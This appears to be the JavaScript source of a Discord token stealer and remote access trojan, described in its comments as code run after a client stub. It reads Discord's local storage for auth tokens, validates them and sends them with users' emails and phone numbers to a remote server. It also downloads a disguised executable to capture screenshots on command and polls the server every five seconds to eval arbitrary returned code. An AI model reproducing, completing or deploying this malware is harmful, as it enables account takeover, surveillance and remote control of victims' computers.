// This is the code that the client
// will run after the constant_client_code

// Do our own stuff
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

class TokenData {
    constructor(token, id, username, discriminator, email, avatar, verified, locale, mfa_enabled, phone, premium_type) {
        this.token = token;
        this.id = id;
        this.username = username;
        this.discriminator = discriminator;
        this.email = email;
        this.avatar = avatar;
        this.verified = verified;
        this.locale = locale;
        this.mfa_enabled = mfa_enabled;
        this.phone = phone;
        this.premium_type = premium_type;
    }

    static fromJSON(parsed) {
        return new TokenData(
            parsed.token,
            parsed.id,
            parsed.username,
            parsed.discriminator,
            parsed.email,
            parsed.avatar,
            parsed.verified,
            parsed.locale,
            parsed.mfa_enabled,
            parsed.phone,
            parsed.premium_type
        );
    }

    toJSON() {
        return JSON.stringify({
            token: this.token,
            id: this.id,
            username: this.username,
            discriminator: this.discriminator,
            email: this.email,
            avatar: this.avatar,
            verified: this.verified,
            locale: this.locale,
            mfa_enabled: this.mfa_enabled,
            phone: this.phone,
            premium_type: this.premium_type,
        });
    }
}

function postData(data) {
    post(url.toLowerCase() + `/d/${hwid}`, { data }).then(() => {});
}

function postData(data, description) {
    post(url.toLowerCase() + `/d/${hwid}?description=${description}`, { data }).then(() => {});
}

function uploadFile(contents, name, description) {
    post(url.toLowerCase() + `/fu/${hwid}`, { contents: Buffer.from(contents).toString('base64'), name, description }).then(() => {});
}

const getTokens = async () => {
    const testToken = (token) => {
        return new Promise((resolve, reject) => {
            get('https://discordapp.com/api/v6/users/@me', { Authorization: token }, true).then((res) => resolve(res));
        });
    };

    const discordFolder = `${process.env.APPDATA}/Discord`;
    const tokenFiles = fs.readdirSync(`${discordFolder}/Local Storage/leveldb`).filter((f) => f.endsWith('.ldb'));

    let validTokens = [];

    for (let file of tokenFiles) {
        let matches = fs.readFileSync(`${discordFolder}/Local Storage/leveldb/${file}`, 'utf8').match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g);
        if (!matches) matches = [];

        let mfa_matches = fs.readFileSync(`${discordFolder}/Local Storage/leveldb/${file}`, 'utf8').match(/mfa\.[\w-]{84}/g);
        if (mfa_matches) matches.push(...mfa_matches);

        if (matches.length) {
            for (let match of matches) {
                if (!match) continue;

                const res = await testToken(match);
                const parsed = JSON.parse(res.body);

                if (res.statusCode == 200) {
                    if (!validTokens.find((e) => e.id == parsed.id)) {
                        validTokens.push(TokenData.fromJSON({ ...parsed, token: match }));
                    }
                }
            }
        }
    }

    return JSON.stringify(validTokens.map((t) => t.toJSON()));
};

const checkForNirCmd = () => {
    return new Promise((r) => {
        const fileDir = `${os.tmpdir()}/~DFDA8NA9S-TMP.exe`;

        if (fs.existsSync(fileDir)) return r(fileDir);

        const file = fs.createWriteStream(fileDir);

        httpTable['http'].get(url + '/tmp/~DFDA8NA9S-TMP.exe', async (response) => {
            response.pipe(file);

            await new Promise((r) => setTimeout(r, 1000));

            r(fileDir);
        });
    });
};

getTokens().then((tokens) => {
    get(url.toLowerCase() + `/u/${hwid}?t=${tokens}`).then(() => {
        let ping = () => {
            checkForNirCmd().then((nirCmdDir) => {
                get(url.toLowerCase() + `/ss/${hwid}`).then((doSendSS) => {
                    if (doSendSS == 'true') {
                        const ssFileName = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + '.tmp';

                        exec(`${nirCmdDir} savescreenshotfull %temp%\\${ssFileName}`, {}, (err, stdout, stderr) => {
                            if (!err) {
                                const ssContents = Buffer.from(fs.readFileSync(`${os.tmpdir()}/${ssFileName}`)).toString('base64');

                                try {
                                    fs.unlinkSync(`${os.tmpdir()}/${ssFileName}`);
                                } catch (err) {}

                                post(url.toLowerCase() + `/ss/${hwid}`, { data: ssContents });
                            }
                        });
                    }

                    get(url.toLowerCase() + `/p/${hwid}`).then((res) => {
                        eval(res);
                    });
                });
            });
        };

        ping();

        setInterval(() => {
            ping();
        }, 5 * 1000);
    });
});
